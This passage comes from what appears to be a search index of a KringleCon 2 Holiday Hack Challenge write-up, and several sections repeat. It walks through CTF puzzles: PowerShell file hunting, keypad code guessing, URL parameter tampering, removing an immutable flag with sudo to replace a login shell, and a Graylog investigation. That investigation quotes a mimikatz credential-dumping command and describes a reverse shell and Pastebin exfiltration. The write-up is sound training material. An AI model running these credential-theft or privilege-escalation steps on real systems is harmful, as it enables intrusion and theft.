Jack Frost gets wind of this? Anyway, the idea of the challenge is to use a series of PowerShell commands to find the right angle, temperature, refraction, and gas mixture parameters to correctly configure the Xmas Cheer Laser so it reaches 5 Mega-Jollies per liter of laser output. Prepare for a scavenger hunt because this challenge will take a while to get through. Let's start by reading the 'callingcard.txt' file. Get-Content /home/callingcard.txt We do as the riddle suggests and show the command history using Get-History . By piping the output of the Get-History command to out-string -Width 150 we make sure that long lines are completely visible (in this case we use width 150). Get-History | out-string -Width 150 We found the correct laser angle value, angle?val=65.5 , and a new hint which states \"I have many name=value variables that I share to applicatons system wide. At a command I will reveal my secrets once you Get my Child Items\" . Sounds like we're talking about environment variables so let's grab those. Get-ChildItem Env: | out-string -Width 300 A new hint stored in the environment variable named riddle says \"Squeezed and compressed I am hidden away. Expand me from my prison and I will show you the way. Recurse through all /etc and Sort on my LastWriteTime to reveal im the newest of all.\" . So we need to iterate over the /etc folder and find the file with the most recent LastWriteTime value. We also suppress any error output by setting $ErrorActionPreference = \u2018SilentlyContinue\u2019 . Got to keep that command output sparkly clean. Get-ChildItem -Recurse -File /etc | ` sort LastWriteTime -Descending -Top 1 | ` select-object fullname,lastwritetime Looks like we found an archive at /etc/apt/archive . When we unpack this file to our home folder we find a 2 new files. One named riddle and what looks like an ELF binary , an executable file format. Expand-Archive /etc/apt/archive -DestinationPath ./ In order to execute the ELF binary we will first need to give it the appropriate execute permissions. This might seem confusing but note that we are running PowerShell on a Linux system which means that commands such as chmod should work as expected. So let's add user execute permissions (u+x) first and then run runme.elf . chmod u+x ./runme.elf ./runme.elf There's our second laser parameter, refraction?val=1.867 , and yet another hint! \"Very shallow am I in the depths of your elf home. You can find my entity by using my md5 identity: 25520151A320B5B0D21561F92C8F6224\" . The folder named depth contains a ton of nested folder and files. Let's use the following PowerShell command to iterate through them and find the path of the file that matches MD5 25520151A320B5B0D21561F92C8F6224. Just like on *NIX system we pipe together different commands. Get-ChildItem -Recurse -File ./ | ` Get-FileHash -Algorithm MD5 | ` Where-Object hash -eq 25520151A320B5B0D21561F92C8F6224 | ` Select path Huzzah! Looks like we just found the correct laser temperature, temperature?val=-33.5 . Our latest hint reads \"I am one of many thousand similar txt's contained within the deepest of /home/elf/depths. Finding me will give you the most strength but doing so will require Piping all the FullName's to Sort Length.\" . We need to find the file in our home folder with the longest FullName (i.e. path + filename). Note the long width value to ensure the full path is visible. Get-ChildItem -Recurse ./ | ` Select-Object -Property FullName | ` Sort-Object -Property {$_.FullName.Length} | ` Select-Object -Last 1 | ` out-string -Width 500 Surprise, another hint! \"Get process information to include Username identification. Stop Process to show me you're skilled and in this order they must be killed: bushy, alabaster, minty, holly. Do this for me and then you /shall/see\" . So we need to first list all processes with their user information and then kill the processes in the order requested. We can use the following two PowerShell commands for this. Be sure to replace $process_id with the correct process ID. Get-Process -IncludeUserName Stop-Process -Id $process_id Once the processes are killed in the correct order a file named /shall/see will be created which contains the next hint. \"Get the .xml children of /etc - an event log to be found. Group all .Id's and the last thing will be in the Properties of the lonely unique event Id.\" . First we need to find all XML files under /etc/ . Get-Childitem \u2013Path /etc -Include *.xml -File -Recurse Per the previous hint we need to group all entries in the event log by their event ID and then find the one entry with a unique ID value. Once we've identified the correct ID value we need to retrieve its properties. We can use the following two PowerShell commands. Import-Clixml /etc/systemd/system/timers.target.wants/EventLog.xml | ` Group-Object -Property ID -NoElement | ` Sort-Object -Property Count -Descending Import-Clixml /etc/systemd/system/timers.target.wants/EventLog.xml | ` Where-Object {$_.ID -eq 1} Looks like we just found the correct gas mixture, O=6,H=7,He=3,N=4,Ne=22,Ar=11,Xe=10,F=20,Kr=8,Rn=9 . We now have all the values we need to correctly configure the Xmas Cheer Laser. Start by turning off the laser and configuring the correct angle, refraction, and temperature. (Invoke-WebRequest -Uri http://localhost:1225/api/off).RawContent (Invoke-WebRequest -Uri http://127.0.0.1:1225/api/angle?val=65.5).RawContent (Invoke-WebRequest -Uri http://127.0.0.1:1225/api/refraction?val=1.867).RawContent (Invoke-WebRequest -Uri http://127.0.0.1:1225/api/temperature?val=-33.5).RawContent Next we configure the correct gas mixture by defining the POST request body as a variable and then using the variable in the actual HTTP request. All that's left is to turn the laser on and verify we reached the required 5 Mega-Jollies per liter of laser output. $correct_gases_postbody = @{O=6;H=7;He=3;N=4;Ne=22;Ar=11;Xe=10;F=20;Kr=8;Rn=9} (Invoke-WebRequest -Uri http://127.0.0.1:1225/api/gas -Method POST -Body $correct_gases_postbody).RawContent (Invoke-WebRequest -Uri http://localhost:1225/api/on).RawContent (Invoke-WebRequest http://127.0.0.1:1225/api/output).RawContent Woaa, a whoppin' 6.07 Mega-Jollies! Time to spread some Xmas cheer! But seriously, think of the snowman. Answer # Angle: 65.5 Refraction: 1.867 Temperature: -33.5 Gas mixture: O=6,H=7,He=3,N=4,Ne=22,Ar=11,Xe=10,F=20,Kr=8,Rn=9 Hint # You got it - three cheers for cheer! For objective 5, have you taken a look at our Zeek logs? Something's gone wrong. But I hear someone named Rita can help us. Can you and she figure out what happened?","title":"Sparkle Redberry - Xmas Cheer Laser"},{"location":"hints/h5/#sparkle-redberry-xmas-cheer-laser","text":"Challenge : Determine Compromised System","title":"Sparkle Redberry - Xmas Cheer Laser"},{"location":"hints/h5/#request","text":"I'm Sparkle Redberry and Imma chargin' my laser! Problem is: the settings are off. Do you know any PowerShell? It'd be GREAT if you could hop in and recalibrate this thing. It spreads holiday cheer across the Earth ... ... when it's working!","title":"Request"},{"location":"hints/h5/#resources","text":"SANS' PowerShell Cheat Sheet","title":"Resources"},{"location":"hints/h5/#solution","text":"Before we go over the solution I'd like to direct everyone's attention to the way Sparkle's running this whole laser experiment. Is there really no other option than pointing insanely intense laser beams at a snowman? I mean, what if Jack Frost gets wind of this? Anyway, the idea of the challenge is to use a series of PowerShell commands to find the right angle, temperature, refraction, and gas mixture parameters to correctly configure the Xmas Cheer Laser so it reaches 5 Mega-Jollies per liter of laser output. Prepare for a scavenger hunt because this challenge will take a while to get through. Let's start by reading the 'callingcard.txt' file. Get-Content /home/callingcard.txt We do as the riddle suggests and show the command history using Get-History . By piping the output of the Get-History command to out-string -Width 150 we make sure that long lines are completely visible (in this case we use width 150). Get-History | out-string -Width 150 We found the correct laser angle value, angle?val=65.5 , and a new hint which states \"I have many name=value variables that I share to applicatons system wide. At a command I will reveal my secrets once you Get my Child Items\" . Sounds like we're talking about environment variables so let's grab those. Get-ChildItem Env: | out-string -Width 300 A new hint stored in the environment variable named riddle says \"Squeezed and compressed I am hidden away. Expand me from my prison and I will show you the way. Recurse through all /etc and Sort on my LastWriteTime to reveal im the newest of all.\" . So we need to iterate over the /etc folder and find the file with the most recent LastWriteTime value. We also suppress any error output by setting $ErrorActionPreference = \u2018SilentlyContinue\u2019 . Got to keep that command output sparkly clean. Get-ChildItem -Recurse -File /etc | ` sort LastWriteTime -Descending -Top 1 | ` select-object fullname,lastwritetime Looks like we found an archive at /etc/apt/archive . When we unpack this file to our home folder we find a 2 new files. One named riddle and what looks like an ELF binary , an executable file format. Expand-Archive /etc/apt/archive -DestinationPath ./ In order to execute the ELF binary we will first need to give it the appropriate execute permissions. This might seem confusing but note that we are running PowerShell on a Linux system which means that commands such as chmod should work as expected. So let's add user execute permissions (u+x) first and then run runme.elf . chmod u+x ./runme.elf ./runme.elf There's our second laser parameter, refraction?val=1.867 , and yet another hint! \"Very shallow am I in the depths of your elf home. You can find my entity by using my md5 identity: 25520151A320B5B0D21561F92C8F6224\" . The folder named depth contains a ton of nested folder and files. Let's use the following PowerShell command to iterate through them and find the path of the file that matches MD5 25520151A320B5B0D21561F92C8F6224. Just like on *NIX system we pipe together different commands. Get-ChildItem -Recurse -File ./ | ` Get-FileHash -Algorithm MD5 | ` Where-Object hash -eq 25520151A320B5B0D21561F92C8F6224 | ` Select path Huzzah! Looks like we just found the correct laser temperature, temperature?val=-33.5 . Our latest hint reads \"I am one of many thousand similar txt's contained within the deepest of /home/elf/depths. Finding me will give you the most strength but doing so will require Piping all the FullName's to Sort Length.\" . We need to find the file in our home folder with the longest FullName (i.e. path + filename). Note the long width value to ensure the full path is visible. Get-ChildItem -Recurse ./ | ` Select-Object -Property FullName | ` Sort-Object -Property {$_.FullName.Length} | ` Select-Object -Last 1 | ` out-string -Width 500 Surprise, another hint! \"Get process information to include Username identification. Stop Process to show me you're skilled and in this order they must be killed: bushy, alabaster, minty, holly. Do this for me and then you /shall/see\" . So we need to first list all processes with their user information and then kill the processes in the order requested. We can use the following two PowerShell commands for this. Be sure to replace $process_id with the correct process ID. Get-Process -IncludeUserName Stop-Process -Id $process_id Once the processes are killed in the correct order a file named /shall/see will be created which contains the next hint. \"Get the .xml children of /etc - an event log to be found. Group all .Id's and the last thing will be in the Properties of the lonely unique event Id.\" . First we need to find all XML files under /etc/ . Get-Childitem \u2013Path /etc -Include *.xml -File -Recurse Per the previous hint we need to group all entries in the event log by their event ID and then find the one entry with a unique ID value. Once we've identified the correct ID value we need to retrieve its properties. We can use the following two PowerShell commands. Import-Clixml /etc/systemd/system/timers.target.wants/EventLog.xml | ` Group-Object -Property ID -NoElement | ` Sort-Object -Property Count -Descending Import-Clixml /etc/systemd/system/timers.target.wants/EventLog.xml | ` Where-Object {$_.ID -eq 1} Looks like we just found the correct gas mixture, O=6,H=7,He=3,N=4,Ne=22,Ar=11,Xe=10,F=20,Kr=8,Rn=9 . We now have all the values we need to correctly configure the Xmas Cheer Laser. Start by turning off the laser and configuring the correct angle, refraction, and temperature. (Invoke-WebRequest -Uri http://localhost:1225/api/off).RawContent (Invoke-WebRequest -Uri http://127.0.0.1:1225/api/angle?val=65.5).RawContent (Invoke-WebRequest -Uri http://127.0.0.1:1225/api/refraction?val=1.867).RawContent (Invoke-WebRequest -Uri http://127.0.0.1:1225/api/temperature?val=-33.5).RawContent Next we configure the correct gas mixture by defining the POST request body as a variable and then using the variable in the actual HTTP request. All that's left is to turn the laser on and verify we reached the required 5 Mega-Jollies per liter of laser output. $correct_gases_postbody = @{O=6;H=7;He=3;N=4;Ne=22;Ar=11;Xe=10;F=20;Kr=8;Rn=9} (Invoke-WebRequest -Uri http://127.0.0.1:1225/api/gas -Method POST -Body $correct_gases_postbody).RawContent (Invoke-WebRequest -Uri http://localhost:1225/api/on).RawContent (Invoke-WebRequest http://127.0.0.1:1225/api/output).RawContent Woaa, a whoppin' 6.07 Mega-Jollies! Time to spread some Xmas cheer! But seriously, think of the snowman.","title":"Solution"},{"location":"hints/h5/#answer","text":"Angle: 65.5 Refraction: 1.867 Temperature: -33.5 Gas mixture: O=6,H=7,He=3,N=4,Ne=22,Ar=11,Xe=10,F=20,Kr=8,Rn=9","title":"Answer"},{"location":"hints/h5/#hint","text":"You got it - three cheers for cheer! For objective 5, have you taken a look at our Zeek logs? Something's gone wrong. But I hear someone named Rita can help us. Can you and she figure out what happened?","title":"Hint"},{"location":"hints/h6/","text":"Tangle Coalbox - Frosty Keypad # Challenge : Splunk Request # Hey kid, it's me, Tangle Coalbox. I'm sleuthing again, and I could use your help. Ya see, this here number lock's been popped by someone. I think I know who, but it'd sure be great if you could open this up for me. I've got a few clues for you. 1. One digit is repeated once. 2. The code is a prime number. 3. You can probably tell by looking at the keypad which buttons are used. Resources # \"One digit is repeated once, it's prime, and you can see which keys were used\" Solution # Based on the hints and the keypad image we see that 1, 3, 7, and 'enter' are the keys that are used most frequently. Since one of the 3 digits is also repeated once the total code has a length of 4. This limits the options to permutations of the following 3 number sets: [1, 1, 3, 7], [1, 3, 3, 7], and [1, 3, 7, 7]. Finally our 4-digit number needs to be prime. To help solve this we can use the following find-code.py Python script . #!/usr/bin/env python3 \"\"\"KringleCon 2 - Frosty Keypad Hint.\"\"\" import itertools def is_prime(number): \"\"\"Verify if a number is a prime.\"\"\" return 2 in [number, 2**number % number] def main(): \"\"\"Execute.\"\"\" digit_sets = [ ['1', '1', '3', '7'], ['1', '3', '3', '7'], ['1', '3', '7', '7'] ] primes = [] for digits in digit_sets: for subset in itertools.permutations(digits): val = int(''.join(subset)) if is_prime(val) and val not in primes: primes.append(val) print(f'{val} is a prime number') if __name__ == \"__main__\": main() The script generates a manageable list of 5 possible candidates. 1373 is a prime number 1733 is a prime number 3137 is a prime number 3371 is a prime number 7331 is a prime number Looks like 7331 is the correct code ! Answer # Code: 7331 Hint # Yep, that's it. Thanks for the assist, gumshoe. Hey, if you think you can help with another problem, Prof. Banas could use a hand too. Head west to the other side of the quad into Hermey Hall and find him in the Laboratory.","title":"Tangle Coalbox - Frosty Keypad"},{"location":"hints/h6/#tangle-coalbox-frosty-keypad","text":"Challenge : Splunk","title":"Tangle Coalbox - Frosty Keypad"},{"location":"hints/h6/#request","text":"Hey kid, it's me, Tangle Coalbox. I'm sleuthing again, and I could use your help. Ya see, this here number lock's been popped by someone. I think I know who, but it'd sure be great if you could open this up for me. I've got a few clues for you. 1. One digit is repeated once. 2. The code is a prime number. 3. You can probably tell by looking at the keypad which buttons are used.","title":"Request"},{"location":"hints/h6/#resources","text":"\"One digit is repeated once, it's prime, and you can see which keys were used\"","title":"Resources"},{"location":"hints/h6/#solution","text":"Based on the hints and the keypad image we see that 1, 3, 7, and 'enter' are the keys that are used most frequently. Since one of the 3 digits is also repeated once the total code has a length of 4. This limits the options to permutations of the following 3 number sets: [1, 1, 3, 7], [1, 3, 3, 7], and [1, 3, 7, 7]. Finally our 4-digit number needs to be prime. To help solve this we can use the following find-code.py Python script . #!/usr/bin/env python3 \"\"\"KringleCon 2 - Frosty Keypad Hint.\"\"\" import itertools def is_prime(number): \"\"\"Verify if a number is a prime.\"\"\" return 2 in [number, 2**number % number] def main(): \"\"\"Execute.\"\"\" digit_sets = [ ['1', '1', '3', '7'], ['1', '3', '3', '7'], ['1', '3', '7', '7'] ] primes = [] for digits in digit_sets: for subset in itertools.permutations(digits): val = int(''.join(subset)) if is_prime(val) and val not in primes: primes.append(val) print(f'{val} is a prime number') if __name__ == \"__main__\": main() The script generates a manageable list of 5 possible candidates. 1373 is a prime number 1733 is a prime number 3137 is a prime number 3371 is a prime number 7331 is a prime number Looks like 7331 is the correct code !","title":"Solution"},{"location":"hints/h6/#answer","text":"Code: 7331","title":"Answer"},{"location":"hints/h6/#hint","text":"Yep, that's it. Thanks for the assist, gumshoe. Hey, if you think you can help with another problem, Prof. Banas could use a hand too. Head west to the other side of the quad into Hermey Hall and find him in the Laboratory.","title":"Hint"},{"location":"hints/h7/","text":"Minty Candycane - Holiday Hack Trail # Challenge : Get Access to the Steam Tunnels Request # Hi! I'm Minty Candycane! I just LOVE this old game! I found it on a 5 1/4\" floppy in the attic. You should give it a go! If you get stuck at all, check out this year's talks. One is about web application penetration testing. Good luck, and don't get dysentery! Resources # Chris Elgee, Web Apps: A Trailhead Solution # Start by looking at the HTML source code for some hints about each difficulty level. Easy # To solve the challenge on 'easy' start the game, click on easy , then click on buy (no need to make any changes to your inventory), change the distance parameter in the URL to whatever value covers the remaining distance, and press <enter> . On the next screen the distance value should have decreased. Now press the Go button. Medium # Solving the challenge on 'medium' really isn't all that different. Instead of manipulating the distance in the URL we now change the distance value in the HTML body. Click on medium , then click the buy button, open up your browser's developer tools, and edit the value of the input tag named distance . Press the Go button. Answer # Easy: change the distance parameter in the URL. Medium: change the distance value in the HTML body. Hint # You made it - congrats! Have you played with the key grinder in my room? Check it out! It turns out: if you have a good image of a key , you can physically copy it . Maybe you'll see someone hopping around with a key here on campus.","title":"Minty Candycane - Holiday Hack Trail"},{"location":"hints/h7/#minty-candycane-holiday-hack-trail","text":"Challenge : Get Access to the Steam Tunnels","title":"Minty Candycane - Holiday Hack Trail"},{"location":"hints/h7/#request","text":"Hi! I'm Minty Candycane! I just LOVE this old game! I found it on a 5 1/4\" floppy in the attic. You should give it a go! If you get stuck at all, check out this year's talks. One is about web application penetration testing. Good luck, and don't get dysentery!","title":"Request"},{"location":"hints/h7/#resources","text":"Chris Elgee, Web Apps: A Trailhead","title":"Resources"},{"location":"hints/h7/#solution","text":"Start by looking at the HTML source code for some hints about each difficulty level.","title":"Solution"},{"location":"hints/h7/#easy","text":"To solve the challenge on 'easy' start the game, click on easy , then click on buy (no need to make any changes to your inventory), change the distance parameter in the URL to whatever value covers the remaining distance, and press <enter> . On the next screen the distance value should have decreased. Now press the Go button.","title":"Easy"},{"location":"hints/h7/#medium","text":"Solving the challenge on 'medium' really isn't all that different. Instead of manipulating the distance in the URL we now change the distance value in the HTML body. Click on medium , then click the buy button, open up your browser's developer tools, and edit the value of the input tag named distance . Press the Go button.","title":"Medium"},{"location":"hints/h7/#answer","text":"Easy: change the distance parameter in the URL. Medium: change the distance value in the HTML body.","title":"Answer"},{"location":"hints/h7/#hint","text":"You made it - congrats! Have you played with the key grinder in my room? Check it out! It turns out: if you have a good image of a key , you can physically copy it . Maybe you'll see someone hopping around with a key here on campus.","title":"Hint"},{"location":"hints/h8/","text":"Alabaster Snowball - Nyanshell # Challenge : Bypassing the Frido Sleigh CAPTEHA Request # Welcome to the Speaker UNpreparedness Room! My name's Alabaster Snowball and I could use a hand. I'm trying to log into this terminal, but something's gone horribly wrong. Every time I try to log in, I get accosted with ... a hatted cat and a toaster pastry? I thought my shell was Bash, not flying feline. When I try to overwrite it with something else, I get permission errors. Have you heard any chatter about immutable files? And what is sudo -l telling me? Resources # \"On Linux, a user's shell is determined by the contents of /etc/passwd\" \"sudo -l says I can run a command as root. What does it do?\" Solution # When you try to log in as Alabaster using su alabaster_snowball you'll end up with a Nyan cat animation you can't exit from. Follow the steps listed below to replace Alabaster's current shell with a copy of /bin/bash . grep -i alabaster /etc/passwd : show Alabaster's default shell. ls -l /bin/nsh : show file permissions. -rwxrwxrwx means anyone can read/write/execute. lsattr /bin/nsh : show file attributes. i means the immutable flag is set. sudo -l : show commands we can run with elevated privileges. In this case sudo chattr . sudo chattr -i /bin/nsh : remove the immutable flag on /bin/nsh so it can be overwritten. cp /bin/bash /bin/nsh : replace Nyan Shell with Bash. su alabaster_snowball : log in as alabaster_snowball. Answer # See solution . Hint # Who would do such a thing?? Well, it IS a good looking cat. Have you heard about the Frido Sleigh contest? There are some serious prizes up for grabs. The content is strictly for elves. Only elves can pass the CAPTEHA challenge required to enter. I heard there was a talk at KCII about using machine learning to defeat challenges like this. I don't think anything could ever beat an elf though!","title":"Alabaster Snowball - Nyanshell"},{"location":"hints/h8/#alabaster-snowball-nyanshell","text":"Challenge : Bypassing the Frido Sleigh CAPTEHA","title":"Alabaster Snowball - Nyanshell"},{"location":"hints/h8/#request","text":"Welcome to the Speaker UNpreparedness Room! My name's Alabaster Snowball and I could use a hand. I'm trying to log into this terminal, but something's gone horribly wrong. Every time I try to log in, I get accosted with ... a hatted cat and a toaster pastry? I thought my shell was Bash, not flying feline. When I try to overwrite it with something else, I get permission errors. Have you heard any chatter about immutable files? And what is sudo -l telling me?","title":"Request"},{"location":"hints/h8/#resources","text":"\"On Linux, a user's shell is determined by the contents of /etc/passwd\" \"sudo -l says I can run a command as root. What does it do?\"","title":"Resources"},{"location":"hints/h8/#solution","text":"When you try to log in as Alabaster using su alabaster_snowball you'll end up with a Nyan cat animation you can't exit from. Follow the steps listed below to replace Alabaster's current shell with a copy of /bin/bash . grep -i alabaster /etc/passwd : show Alabaster's default shell. ls -l /bin/nsh : show file permissions. -rwxrwxrwx means anyone can read/write/execute. lsattr /bin/nsh : show file attributes. i means the immutable flag is set. sudo -l : show commands we can run with elevated privileges. In this case sudo chattr . sudo chattr -i /bin/nsh : remove the immutable flag on /bin/nsh so it can be overwritten. cp /bin/bash /bin/nsh : replace Nyan Shell with Bash. su alabaster_snowball : log in as alabaster_snowball.","title":"Solution"},{"location":"hints/h8/#answer","text":"See solution .","title":"Answer"},{"location":"hints/h8/#hint","text":"Who would do such a thing?? Well, it IS a good looking cat. Have you heard about the Frido Sleigh contest? There are some serious prizes up for grabs. The content is strictly for elves. Only elves can pass the CAPTEHA challenge required to enter. I heard there was a talk at KCII about using machine learning to defeat challenges like this. I don't think anything could ever beat an elf though!","title":"Hint"},{"location":"hints/h9/","text":"Pepper Minstix - Graylog # Challenge : Retrieve the Scraps of Paper from Server Request # It's me - Pepper Minstix. Normally I'm jollier, but this Graylog has me a bit mystified. Have you used Graylog before? It is a log management system based on Elasticsearch, MongoDB, and Scala. Some Elf U computers were hacked, and I've been tasked with performing incident response. Can you help me fill out the incident response report using our instance of Graylog? It's probably helpful if you know a few things about Graylog. Event IDs and Sysmon are important too. Have you spent time with those? Don't worry - I'm sure you can figure this all out for me! Click on the All messages Link to access the Graylog search interface! Make sure you are searching in all messages! The Elf U Graylog server has an integrated incident response reporting system. Just mouse-over the box in the lower-right corner. Login with the username elfustudent and password elfustudent. Resources # Graylog Docs Solution # Question 1 # \"Minty CandyCane reported some weird activity on his computer after he clicked on a link in Firefox for a cookie recipe and downloaded a file. What is the full-path + filename of the first malicious file downloaded by Minty?\" First select the 'All messages' stream and change the search time frame from 'Search in the last 5 minutes' to 'Search in all messages'. Later on we can narrow things down again but for our initial set of queries we need to cast as wide a net as possible. The Windows Security Log Encyclopedia is a great resource if you need to find information about Windows and Sysmon log events. To answer the first question search for file creation events (i.e. Sysmon event ID 2 ) from processes named firefox.exe but filter out some of the noise by excluding filenames ending in .temp. For regular expressions use /regex pattern/ . The sidebar to the left can be used to only show relevant fields in the search results. EventID:2 AND ProcessImage:/.*firefox.exe/ AND NOT TargetFilename:/.*temp/ Answer : C:\\Users\\minty\\Downloads\\cookie_recipe.exe Question 2 # \"The malicious file downloaded and executed by Minty gave the attacker remote access to his machine. What was the ip:port the malicious file connected to first?\" To find network activity for a particular process, search for the process name or full process path together with Sysmon event ID 3 . As the TargetFileName field isn't relevant for network events, replace it with DestinationHostname and DestinationIp instead. Also, be sure to escape special characters like : and \\ . EventID:3 AND ProcessImage:C\\:\\\\Users\\\\minty\\\\Downloads\\\\cookie_recipe.exe Answer : 192.168.247.175:4444 Question 3 # \"What was the first command executed by the attacker? (answer is a single word)\" Interesting! 4444 looks like a port typically used by a Metasploit Meterpreter reverse shell. Anything the attacker executes from that remote shell will most likely show up as spawning from the reverse shell binary. Let's search for process creation events (i.e. Sysmon event ID 1 ) which have cookie_recipe.exe as the parent. Be sure to sort the results by timestamp. EventID:1 AND ParentProcessImage:C\\:\\\\Users\\\\minty\\\\Downloads\\\\cookie_recipe.exe Answer : whoami Question 4 # \"What is the one-word service name the attacker used to escalate privileges?\" The previous query will provides the correct answer when you scroll down far enough. Adding a search term that narrows the results to commands that perform service related actions helps get rid of some of the noise though. Controlling a Windows service is done using the sc command, so let's add that as an additional search term. Looks like our attacker exploited the WebExec vulnerability . EventID:1 AND ParentProcessImage:C\\:\\\\Users\\\\minty\\\\Downloads\\\\cookie_recipe.exe AND CommandLine/.*sc.*/ Answer : webexservice Question 5 # \"What is the file-path + filename of the binary ran by the attacker to dump credentials?\" Based on the information from the previous search we now know that the attacker escalated privileges to the cookie_recipe2.exe binary. Just like before we search for Sysmon event ID 1 with cookie_recipe2.exe as the parent. Our attacker downloaded mimikatz.exe as cookie.exe and then dumped credentials using C:\\cookie.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit \" EventID:1 AND ParentProcessImage:C\\:\\\\Users\\\\minty\\\\Downloads\\\\cookie_recipe2.exe Answer : C:\\cookie.exe Question 6 # \"The attacker pivoted to another workstation using credentials gained from Minty's computer. Which account name was used to pivot to another machine?\" Back to network events we go and more specifically logon events originating from the attacker machine. We know the reverse shell connection went back to IP 192.168.247.175 . If we combine this information with Windows event ID 4624 , which tracks successful login activity, and exclude Minty's workstation we should be able to find the other host and the account name used to log in there. EventID:4624 AND SourceNetworkAddress:192.168.247.175 AND NOT DestinationHostname:elfu-res-wks1 Answer : alabaster Question 7 # \"What is the time (HH:MM:SS) the attacker makes a Remote Desktop connection to another machine?\" Windows event ID 4624 tracks a number of different logon types like local interactive (i.e. logon type 2) and connections to shared folders across the network (i.e. logon type 3). It also tracks remote interactive login activity like Remote Desktop via logon type 10 . EventID:4624 AND LogonType:10 Answer : 06:04:28 Question 8 # \"The attacker navigates the file system of a third host using their Remote Desktop Connection to the second host. What is the SourceHostName,DestinationHostname,LogonType of this connection? (submit in that order as csv)\" At this point we can start limiting our searches to activity that happened since the previously found events. We're still searching for logon activity using Windows event ID 4624 but this time we're looking for connections to shared folders or logon type 3 . timestamp:[\"2019-11-19 06:04:28.000\" TO *] AND EventID:4624 AND LogonType:3 Answer : ELFU-RES-WKS2,elfu-res-wks3,3 Question 9 # \"What is the full-path + filename of the secret research document after being transferred from the third host to the second host?\" Just like the Firefox download from question 1, copying a file means writing it to disk and thus generating a file creation time event (i.e. Sysmon event ID 2 ). Add the source name for the second host, limit the results to activity that happened since the Remote Desktop login, and filter out any file names ending in .temp or .xml to find the research document. EventID:2 AND source:elfu-res-wks2 AND timestamp:[\"2019-11-19 06:04:28.000\" TO *] AND NOT TargetFilename:/.*(.temp|.xml)/ Answer : C:\\Users\\alabaster\\Desktop\\super_secret_elfu_research.pdf Question 10 # \"What is the IPv4 address (as found in logs) the secret research document was exfiltrated to?\" First we need to understand how the data was exfiltrated (i.e. what commands were used) before we can answer the question where it was exfiltrated to. Begin by searching for just filename of the exfiltrated document, super_secret_elfu_research.pdf . super_secret_elfu_research.pdf It appears our attacker used PowerShell to upload the file to Pastebin. Now that we know how the data was exfiltrated we can search for Sysmon event ID 3 (i.e. a network connection) and the pastebin.com domain to retrieve the associated destination IP address. EventID:3 AND DestinationHostname:pastebin.com Answer : 104.22.3.84 Answer # C:\\Users\\minty\\Downloads\\cookie_recipe.exe 192.168.247.175:4444 whoami webexservice C:\\cookie.exe alabaster 06:04:28 ELFU-RES-WKS2,elfu-res-wks3,3 C:\\Users\\alabaster\\Desktop\\super_secret_elfu_research.pdf 104.22.3.84 Hint # That's it - hooray! Have you had any luck retrieving scraps of paper from the Elf U server? You might want to look into SQL injection techniques. OWASP is always a good resource for web attacks. For blind SQLi, I've heard Sqlmap is a great tool. In certain circumstances though, you need custom tamper scripts to get things going!","title":"Pepper Minstix - Graylog"},{"location":"hints/h9/#pepper-minstix-graylog","text":"Challenge : Retrieve the Scraps of Paper from Server","title":"Pepper Minstix - Graylog"},{"location":"hints/h9/#request","text":"It's me - Pepper Minstix. Normally I'm jollier, but this Graylog has me a bit mystified. Have you used Graylog before? It is a log management system based on Elasticsearch, MongoDB, and Scala. Some Elf U computers were hacked, and I've been tasked with performing incident response. Can you help me fill out the incident response report using our instance of Graylog? It's probably helpful if you know a few things about Graylog. Event IDs and Sysmon are important too. Have you spent time with those? Don't worry - I'm sure you can figure this all out for me! Click on the All messages Link to access the Graylog search interface! Make sure you are searching in all messages! The Elf U Graylog server has an integrated incident response reporting system. Just mouse-over the box in the lower-right corner. Login with the username elfustudent and password elfustudent.","title":"Request"},{"location":"hints/h9/#resources","text":"Graylog Docs","title":"Resources"},{"location":"hints/h9/#solution","text":"","title":"Solution"},{"location":"hints/h9/#question-1","text":"\"Minty CandyCane reported some weird activity on his computer after he clicked on a link in Firefox for a cookie recipe and downloaded a file. What is the full-path + filename of the first malicious file downloaded by Minty?\" First select the 'All messages' stream and change the search time frame from 'Search in the last 5 minutes' to 'Search in all messages'. Later on we can narrow things down again but for our initial set of queries we need to cast as wide a net as possible. The Windows Security Log Encyclopedia is a great resource if you need to find information about Windows and Sysmon log events. To answer the first question search for file creation events (i.e. Sysmon event ID 2 ) from processes named firefox.exe but filter out some of the noise by excluding filenames ending in .temp. For regular expressions use /regex pattern/ . The sidebar to the left can be used to only show relevant fields in the search results. EventID:2 AND ProcessImage:/.*firefox.exe/ AND NOT TargetFilename:/.*temp/ Answer : C:\\Users\\minty\\Downloads\\cookie_recipe.exe","title":"Question 1"},{"location":"hints/h9/#question-2","text":"\"The malicious file downloaded and executed by Minty gave the attacker remote access to his machine. What was the ip:port the malicious file connected to first?\" To find network activity for a particular process, search for the process name or full process path together with Sysmon event ID 3 . As the TargetFileName field isn't relevant for network events, replace it with DestinationHostname and DestinationIp instead. Also, be sure to escape special characters like : and \\ . EventID:3 AND ProcessImage:C\\:\\\\Users\\\\minty\\\\Downloads\\\\cookie_recipe.exe Answer : 192.168.247.175:4444","title":"Question 2"},{"location":"hints/h9/#question-3","text":"\"What was the first command executed by the attacker? (answer is a single word)\" Interesting! 4444 looks like a port typically used by a Metasploit Meterpreter reverse shell. Anything the attacker executes from that remote shell will most likely show up as spawning from the reverse shell binary. Let's search for process creation events (i.e. Sysmon event ID 1 ) which have cookie_recipe.exe as the parent. Be sure to sort the results by timestamp. EventID:1 AND ParentProcessImage:C\\:\\\\Users\\\\minty\\\\Downloads\\\\cookie_recipe.exe Answer : whoami","title":"Question 3"},{"location":"hints/h9/#question-4","text":"\"What is the one-word service name the attacker used to escalate privileges?\" The previous query will provides the correct answer when you scroll down far enough. Adding a search term that narrows the results to commands that perform service related actions helps get rid of some of the noise though. Controlling a Windows service is done using the sc command, so let's add that as an additional search term. Looks like our attacker exploited the WebExec vulnerability . EventID:1 AND ParentProcessImage:C\\:\\\\Users\\\\minty\\\\Downloads\\\\cookie_recipe.exe AND CommandLine/.*sc.*/ Answer : webexservice","title":"Question 4"},{"location":"hints/h9/#question-5","text":"\"What is the file-path + filename of the binary ran by the attacker to dump credentials?\" Based on the information from the previous search we now know that the attacker escalated privileges to the cookie_recipe2.exe binary. Just like before we search for Sysmon event ID 1 with cookie_recipe2.exe as the parent. Our attacker downloaded mimikatz.exe as cookie.exe and then dumped credentials using C:\\cookie.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit \" EventID:1 AND ParentProcessImage:C\\:\\\\Users\\\\minty\\\\Downloads\\\\cookie_recipe2.exe Answer : C:\\cookie.exe","title":"Question 